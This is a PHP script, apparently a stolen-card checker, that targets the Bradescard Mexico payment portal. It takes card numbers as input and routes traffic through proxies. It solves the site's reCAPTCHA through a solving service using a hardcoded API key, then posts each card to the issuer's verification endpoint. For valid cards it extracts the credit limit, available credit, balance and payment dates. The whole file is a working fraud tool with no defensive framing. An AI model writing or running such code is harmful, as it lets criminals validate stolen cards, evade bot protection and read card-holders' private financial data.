

<?php

require   "../Capsolver/vendor/autoload.php";
require   "../CurlX.php";




$cc = $argv[1];
$mes = $argv[2];
$ano = $argv[3];
$cvv = $argv[4];

echo Bradescard("$cc");


function Bradescard ($lista){

    
    $separa = explode("|", $lista);
    $cc = trim($separa[0]);


    $result = [];
    $curl = new CurlX;

    $cookie = uniqid();

    // ⚠️ CONFIGURAR EN config.php
    $proxyConfig = getProxyConfig();
    $socks5 = $proxyConfig['server'] ?? 'YOUR_PROXY_SERVER';
    $rotate = $proxyConfig['auth'] ?? 'YOUR_PROXY_AUTH';


    $cookie = uniqid();

    $server = null;

$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
];
$request = $curl::Get('https://www.bradescard.com.mx/bradescard.site/pago/index.html', $headers, $cookie, $server = NULL);


$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');


$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://www.bradescard.com.mx/',
      'websiteKey'    => '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn',
    ]
);

$captcha = $solution["gRecaptchaResponse"];


$headers = [
    'accept: application/json, text/javascript, */*; q=0.01',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.bradescard.com.mx',
    'referer: https://www.bradescard.com.mx/bradescard.site/pago/index.html',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];
$data = 'token='.$captcha.'&tarjeta='.$cc.'&terminos=true';
$request = $curl::Post('https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta', $data, $headers, $cookie, $server);

if (substr_count($request->body, 'No se pudo verificar la tarjeta, intente más tarde')) {
    $result = [
        'status' => 'false',
        'message' => '<b>Card</b> : <code>$cc</code> -> No se pudo verificar la tarjeta | <b>Status: False!',
    ];
    return json_encode($result);
}
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://www.bradescard.com.mx/bradescard.site/pago/index.html',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
];
$request = $curl::Get('https://www.bradescard.com.mx/bradescard.net/', $headers, $cookie, $server);

$numerotarjetacliente = $curl::ParseString($request->body ,"numerotarjetacliente: '", "'");

$headers = [
    'accept: */*',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.bradescard.com.mx',
    'referer: https://www.bradescard.com.mx/bradescard.net/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];
$data = 'numerotarjetacliente='.urlencode($numerotarjetacliente).'';
$request = $curl::Post('https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea', $data, $headers, $cookie, $server);

if (substr_count($request->body, 'An error occurred while processing your request')) {
    $result = [
        'status' => 'false',
        'message' => "<b>Card</b> : <code>$cc</code> -> No se pudo verificar la tarjeta | Status: False!",
    ];
    return json_encode($result);
}

$data = json_decode($request->body, true);
$FechaLimitePagoPersona = $data["FechaLimitePagoPersona"];
$PagoTotalMesPersona = $data["PagoTotalMesPersona"];
$FechaCortePersona = $data["FechaCortePersona"];
$DisponibleComprasPersona = $data["DisponibleComprasPersona"];
$SaldoTotalPersona = $data["SaldoTotalPersona"];
$LimiteCreditoPersona = $data["LimiteCreditoPersona"];

$result = [
    'status' => 'true',
    'message' => "<b><b>Card</b> : <code>$cc</code> -> <b>Disponible Compras</b>: $DisponibleComprasPersona | <b>Pago Minimo or Pago Total Mes</b>: $PagoTotalMesPersona |<b>Limite de Credito</b>: $LimiteCreditoPersona |<b>Fecha Limite de Pago</b>: $FechaLimitePagoPersona | <b>Fecha Corte</b>: $FechaCortePersona | <b>Saldo Total</b>: $SaldoTotalPersona</b>"
];
return json_encode($result);
}






